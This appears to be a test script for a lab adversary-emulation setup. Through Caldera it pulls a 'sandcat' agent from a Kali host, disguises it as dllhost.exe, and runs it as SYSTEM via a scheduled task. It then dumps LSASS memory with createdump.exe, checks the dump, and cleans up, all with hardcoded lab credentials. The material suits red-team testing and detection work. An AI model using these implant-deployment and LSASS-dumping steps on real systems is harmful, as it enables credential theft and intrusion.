import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const KALI_SSH = "kali:kali"
const WINRM_AUTH = "localuser:password"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

// ─── Building Blocks ─────────────────────────────────────────────────────────

async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

// ─── Connectivity Tests ─────────────────────────────────────────────────────

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Sandcat Agent Deployment Test ──────────────────────────────────────────

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  try {
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    console.log("\n  [2] Download sandcat.go -> C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    console.log("\n  [4] Deploy sandcat via Scheduled Task as SYSTEM, wait 20s, check alive")
    const taskName = `CalderaSandcat-${group}`
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

// ─── Full Pipeline Integration Test ──────────────────────────────────────────

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Dump LSASS with createdump.exe from .Net v5 ===")

  const abilityId = "8e01631039faf6a9a84df376bf9ad0f1"
  const abilityName = "Dump LSASS with createdump.exe from .Net v5"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  let agentPaw = null

  try {
    // ── Step 1: Clean slate ──
    console.log("\n  [1/6] Cleaning previous agents, processes, and tasks...")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: Install .NET 5 Runtime on Windows (needed for createdump.exe) ──
    console.log("\n  [2/6] Checking .NET 5+ Runtime on Windows (required for createdump.exe)...")
    let dotnetOk = false
    try {
      const netCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Get-ChildItem -Path $env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App -Filter createdump.exe -Recurse -Depth 2 -ErrorAction SilentlyContinue) { Write-Host \'FOUND\' } else { Write-Host \'NOT_FOUND\' }"')
      console.log(`    => .NET runtime: ${netCheck.trim()}`)
      if (netCheck.trim() === "FOUND") dotnetOk = true
    } catch {}
    if (!dotnetOk) {
      console.log("    => .NET not found, installing 5.0.17 runtime silently (this may take 1-2 minutes)...")
      try {
        await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $url = \'https://download.visualstudio.microsoft.com/download/pr/a0832b5a-6900-442b-af79-6ffddddd6ba4/e2df0b25dd851ee0b38a86947dd0e42e/dotnet-runtime-5.0.17-win-x64.exe\'; $out = \'C:\\Users\\Public\\dotnet-runtime-5.0.17.exe\'; Invoke-WebRequest -Uri $url -OutFile $out; Write-Host \'DOWNLOADED\'"')
        console.log("    => .NET runtime installer downloaded")
        await winrmRun(WIN11_IP, "localuser", "password",
          'powershell -Command "Start-Process -FilePath \'C:\\Users\\Public\\dotnet-runtime-5.0.17.exe\' -ArgumentList \'/install /quiet /norestart\' -Wait; Remove-Item \'C:\\Users\\Public\\dotnet-runtime-5.0.17.exe\' -Force; Write-Host \'INSTALLED\'"')
        console.log("    => .NET 5.0.17 runtime installed")
        try {
          const verifyCheck = await winrmRun(WIN11_IP, "localuser", "password",
            'powershell -Command "if (Get-ChildItem -Path $env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App -Filter createdump.exe -Recurse -Depth 2 -ErrorAction SilentlyContinue) { Write-Host \'VERIFIED\' } else { Write-Host \'STILL_MISSING\' }"')
          console.log(`    => Post-install check: ${verifyCheck.trim()}`)
        } catch {}
      } catch (err) {
        console.log(`    => .NET install failed: ${err.message}`)
      }
    } else {
      console.log("    => .NET runtime already present, skipping install")
    }

    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [3/6] Deploying sandcat as SYSTEM (group=${group})...`)
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    // ── Step 4: Wait for agent + fetch ability ──
    console.log(`\n  [4/6] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [4b/6] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
    console.log(`    => command: ${ability.executors[0].command}`)

    // ── Step 5: Exploit agent with ability ──
    console.log(`\n  [5/6] Exploiting agent with ability (createdump.exe from .NET runtime)...`)
    console.log(`    => Using command as-is (resolves createdump.exe at runtime)`)

    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    // Wait for link to appear
    console.log(`    => Waiting for link (120s timeout)...`)
    let linkFacts = []
    let linkStatus = null
    let linkOutput = null
    const pollStart = Date.now()
    while (Date.now() - pollStart < 120000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
        if (mine.finish != null) {
          console.log(`    Command: ${mine.command}`)
          console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
          console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
          console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
          linkStatus = mine.status
          linkFacts = mine.facts || []
          linkOutput = mine.output?.stdout || ""
          break
        }
        console.log(`    Link pending (status=${mine.status}), waiting...`)
      }
      await new Promise(r => setTimeout(r, 2000))
    }

    // ── Step 6: Verify dump file ──
    console.log(`\n  [6/6] Verifying dump file (SYSTEM writes to C:\\Windows\\Temp)...`)
    let dumpExists = false
    try {
      const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Windows\\Temp\\dotnet-lsass.dmp\') { $f=Get-Item \'C:\\Windows\\Temp\\dotnet-lsass.dmp\'; Write-Host \\"EXISTS $([math]::Round($f.Length/1024/1024,1))MB\\" } else { Write-Host \\"MISSING\\" }"')
      console.log(`    => Dump file: ${dumpCheck.trim()}`)
      dumpExists = dumpCheck.trim().startsWith("EXISTS")
    } catch (err) {
      console.log(`    => Dump file check failed: ${err.message}`)
    }

    for (const f of linkFacts.slice(0, 10)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }

    const passed = dumpExists
    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (dump exists=${dumpExists}, link status=${linkStatus}, facts=${linkFacts.length})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    // ── Cleanup: always run, best-effort ──
    console.log("\n  [cleanup] Removing agent, task, process, and dump...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\dotnet-lsass.dmp\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_DELETED\'"')
      console.log("    dump file deleted")
    } catch {}
    console.log("    => cleanup complete")
  }
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log("testAbility — Dump LSASS with createdump.exe from .Net v5\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed`)
  console.log(`\n  Ability: Dump LSASS with createdump.exe from .Net v5`)
  console.log(`  Ability ID: 8e01631039faf6a9a84df376bf9ad0f1`)
  console.log(`  No kali prereq, win_prereq installs .NET 5.0.17 runtime (provides createdump.exe)`)
  console.log(`  Dump output: C:\\Windows\\Temp\\dotnet-lsass.dmp`)
}

main().catch(console.error)
